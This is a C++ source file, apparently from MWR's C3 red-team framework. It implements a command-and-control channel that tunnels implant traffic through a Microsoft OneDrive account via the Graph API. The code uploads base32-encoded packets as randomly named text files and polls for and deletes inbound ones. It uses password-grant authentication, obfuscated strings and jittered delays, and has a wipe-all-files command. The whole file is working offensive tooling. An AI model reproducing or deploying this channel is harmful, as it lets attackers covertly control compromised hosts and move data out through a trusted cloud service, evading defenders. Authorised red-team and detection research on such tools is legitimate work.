#include "StdAfx.h"
#include "OneDrive365RestFile.h"
#include "Common/MWR/CppTools/Utils.h"
#include "Common/MWR/Crypto/Base32.h"
#include "Common/MWR/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"

// Namespaces.
using json = nlohmann::json;
using namespace utility::conversions;

std::atomic<std::chrono::steady_clock::time_point> MWR::C3::Interfaces::Channels::OneDrive365RestFile::s_TimePoint = std::chrono::steady_clock::now();

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Channels::OneDrive365RestFile::OneDrive365RestFile(ByteView arguments)
	: m_InboundDirectionName{ arguments.Read<std::string>()}
	, m_OutboundDirectionName{ arguments.Read<std::string>()}
{
	// Obtain proxy information and store it in the HTTP configuration.
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		m_HttpConfig.set_proxy(winProxy == OBF_W(L"auto") ? web::web_proxy::use_auto_discovery : web::web_proxy(winProxy));

	// Retrieve auth data.
	std::string username, clientKey, clientSecret;
	std::tie(username, m_Password, clientKey, clientSecret) = arguments.Read<std::string, std::string, std::string, std::string>();

	web::http::oauth2::experimental::oauth2_config oauth2Config(
		to_utf16string(std::move(clientKey)),
		to_utf16string(std::move(clientSecret)),
		OBF_W(L"https://login.windows.net/common/oauth2/v2.0/authorize"),
		OBF_W(L"https://login.windows.net/organizations/oauth2/v2.0/token"),
		OBF_W(L""),
		OBF_W(L"https://graph.microsoft.com/.default"),
		to_utf16string(username)
	);

	// Set the above configuration in the HTTP configuration for cpprestsdk (it already includes proxy information from the code above).
	m_HttpConfig.set_oauth2(std::move(oauth2Config));

	// For simplicity access token is not a configuration parameter. Refresh token will be used to generate first access token.
	RefreshAccessToken();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t MWR::C3::Interfaces::Channels::OneDrive365RestFile::OnSendToChannel(ByteView data)
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + MWR::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	try
	{
		// Construct the HTTP request
		auto URLwithFilename = OBF("https://graph.microsoft.com/v1.0/me/drive/root:/") + m_OutboundDirectionName + OBF("-") + MWR::Utils::GenerateRandomString(20) + OBF(".txt") + OBF(":/content");
		web::http::client::http_client client(to_string_t(URLwithFilename), m_HttpConfig);
		web::http::http_request request(web::http::methods::PUT);

		// Data can be just sent as a text stream
		request.set_body(cppcodec::base32_crockford::encode(&data.front(), data.size()));
		request.headers().set_content_type(OBF_W(L"text/plain"));

		pplx::task<void> task = client.request(request).then([&](web::http::http_response response)
		{
			if (response.status_code() == web::http::status_codes::Created)
				return;

			if (response.status_code() == web::http::status_codes::TooManyRequests) // break and set sleep time.
			{
				s_TimePoint = std::chrono::steady_clock::now() + std::chrono::seconds{ stoul(response.headers().find(OBF_W(L"Retry-After"))->second) };
				throw std::runtime_error{ OBF("Too many requests") };
			}

			if (response.status_code() == web::http::status_codes::BadRequest)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("Bad Request") };
			}

			throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(response.status_code()) };
		});

		task.wait();
		return data.size();
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Warning });
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Channels::OneDrive365RestFile::OnReceiveFromChannel()
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + MWR::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	ByteVector packet;
	try
	{
		// Construct request to get files.
		// The OneDrive API does have a search function that helps finding items by m_InboundDirectionName.
		// However, this function does not appear to update in real time to reflect the status of what is actually in folders.
		// Therefore, we need to use a standard directory listing, and manually check the filenames to determine which files to request.
		// This directory listing fetches up to 1000 files.
		web::http::client::http_client client(OBF_W(L"https://graph.microsoft.com/v1.0/me/drive/root/children?top=1000"), m_HttpConfig);
		web::http::http_request request(web::http::methods::GET);

		pplx::task<void> task = client.request(request).then([&](web::http::http_response response)
		{
			if (response.status_code() == web::http::status_codes::OK) // ==200
				return response.extract_string();

			if (response.status_code() == web::http::status_codes::TooManyRequests) // break and set sleep time.
			{
				s_TimePoint = std::chrono::steady_clock::now() + std::chrono::seconds{ stoul(response.headers().find(OBF_W(L"Retry-After"))->second) };
				throw std::runtime_error{ OBF("Too many requests") };
			}

			if (response.status_code() == web::http::status_codes::BadRequest)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("Bad Request") };
			}

			throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(response.status_code()) };

		})
		.then([&](pplx::task<std::wstring> taskData)
		{
			// Gracefully handle situation where there's an empty JSON value (e.g., a failed request)
			if (taskData.get().empty())
				return;

			// Convert response (as string_t to utf8) and parse.
			json taskDataAsJSON;
			try
			{
				taskDataAsJSON = json::parse(to_utf8string(taskData.get()));
			}
			catch (json::parse_error)
			{
				Log({ OBF("Failed to parse the list of received files."), LogMessage::Severity::Error });
				return;
			}

			for (auto& element : taskDataAsJSON.at(OBF("value")))
			{
				// Obtain subject and task ID.
				std::string filename = element.at(OBF("name")).get<std::string>();
				std::string id = element.at(OBF("id")).get<std::string>();

				// Verify that the full subject and ID were obtained.  If not, ignore.
				if (filename.empty() || id.empty())
					continue;

				// Check the direction component is at the start of name.
				if (filename.find(m_InboundDirectionName))
					continue;

				web::http::client::http_client clientFile(to_string_t(element.at(OBF("@microsoft.graph.downloadUrl")).get<std::string>()), m_HttpConfig);
				std::string fileAsString;

				pplx::task<void> fileRequest = clientFile.request({ web::http::methods::GET }).then([this, &fileAsString](web::http::http_response response)
				{
					if (response.status_code() == web::http::status_codes::OK) // ==200
						fileAsString = to_utf8string(response.extract_string().get());
				});

				try
				{
					fileRequest.wait();
				}
				catch (const web::http::http_exception& exception)
				{
					Log({ OBF_SEC("Caught a HTTP exception during OnReceive(): ") +exception.what(), LogMessage::Severity::Warning });
					continue;
				}

				try
				{
					packet = cppcodec::base32_crockford::decode(fileAsString);
					SCOPE_GUARD{ RemoveFile(id); };
					return;

				}
				catch (const cppcodec::parse_error& exception)
				{
					Log({ OBF("Error decoding task #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
				}
				catch (std::exception& exception)
				{
					Log({ OBF("Caught a std::exception when processing file #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
				}
			}
		});

		task.wait();
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packet;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Channels::OneDrive365RestFile::RemoveAllFiles(ByteView)
{
	try
	{
		// Construct request.
		auto client = web::http::client::http_client{ OBF_W(L"https://graph.microsoft.com/v1.0/me/drive/root/children"), m_HttpConfig };
		pplx::task<void> task = client.request({ web::http::methods::GET }).then([this](web::http::http_response response)
		{
				if (response.status_code() != web::http::status_codes::OK)
				{
					Log({ OBF("RemoveAllFiles() Error.  Files could not be deleted.  Confirm access and refresh tokens are correct."), LogMessage::Severity::Error });
					return;
				}

				// Parse response (list of tasks)
				auto taskDataAsJSON = nlohmann::json::parse(to_utf8string(response.extract_string().get()));

				// For each task (under the "value" key), extract the ID, and send a request to delete the task.
				for (auto& element : taskDataAsJSON.at(OBF("value")))
					RemoveFile(element.at(OBF("id")).get<std::string>());
		});

		task.wait();
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") +exception.what(), LogMessage::Severity::Warning });
	}

	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Channels::OneDrive365RestFile::RefreshAccessToken()
{
	try
	{
		auto oa2 = m_HttpConfig.oauth2();
		auto client = web::http::client::http_client(oa2->token_endpoint(), m_HttpConfig);
		auto request = web::http::http_request(web::http::methods::POST);
		request.headers().set_content_type(OBF_W(L"application/x-www-form-urlencoded"));
		auto requestBody = ""s;
		requestBody += OBF("grant_type=password");
		requestBody += OBF("&scope=");
		requestBody += to_utf8string(oa2->scope());
		requestBody += OBF("&username=");
		requestBody += to_utf8string(oa2->user_agent());
		requestBody += OBF("&password=");
		requestBody += m_Password;
		requestBody += OBF("&client_id=");
		requestBody += to_utf8string(oa2->client_key());
		if (!oa2->client_secret().empty())
		{
			requestBody += OBF("&client_secret=");
			requestBody += to_utf8string(oa2->client_secret());
		}

		request.set_body(requestBody);
		pplx::task<void> task = client.request(request).then([&](web::http::http_response response)
		{
			if (response.status_code() != web::http::status_codes::OK)
				throw std::runtime_error{ OBF("Refresh access token request - non-200 status code was received: ") + std::to_string(response.status_code()) };

			// If successful, parse the useful information from the response.
			auto taskDataAsJSON = nlohmann::json::parse(to_utf8string(response.extract_string().get()));

			auto tokenCopy = oa2->token();
			tokenCopy.set_access_token(to_string_t(taskDataAsJSON.at(OBF("access_token")).get<std::string>()));
			tokenCopy.set_expires_in(taskDataAsJSON.at(OBF("expires_in")).get<std::int64_t>());
			oa2->set_token(tokenCopy);
		});
		task.wait();
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error{ OBF_STR("Cannot refresh token: ") + exception.what() };
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Channels::OneDrive365RestFile::RemoveFile(std::string const& id)
{
	// There is a minor logic flaw in this part of the code, as it assumes the access token is still valid, which may not be the case.
	auto URLwithID = OBF("https://graph.microsoft.com/v1.0/me/drive/items/") + id;
	auto client = web::http::client::http_client{ to_string_t(URLwithID), m_HttpConfig };
	auto task = client.request({ web::http::methods::DEL }).then([&](web::http::http_response response)
		{
			if (response.status_code() > 205)
				Log({ OBF("RemoveFile() Error. Task could not be deleted. HTTP response:") + std::to_string(response.status_code()), LogMessage::Severity::Error });
		});

	task.wait();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Channels::OneDrive365RestFile::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		return RemoveAllFiles(command);
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteView MWR::C3::Interfaces::Channels::OneDrive365RestFile::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"description": "User with Office 365 subscription."
			},
			{
				"type": "string",
				"name": "Password",
				"min": 1,
				"description": "User password."
			},
			{
				"type": "string",
				"name": "Client key",
				"min": 1,
				"description": "Identifies the application (e.g. a GUID). User, or user admin must give consent for application to work in user context."
			},
			{
				"type": "string",
				"name": "Client secret",
				"description": "Leave empty if not required."
			}
		]
	},
	"commands":
	[
		{
			"name": "Remove all files",
			"id": 0,
			"description": "Clearing old files from server may increase bandwidth",
			"arguments": []
		}
	]
}
)_";
}
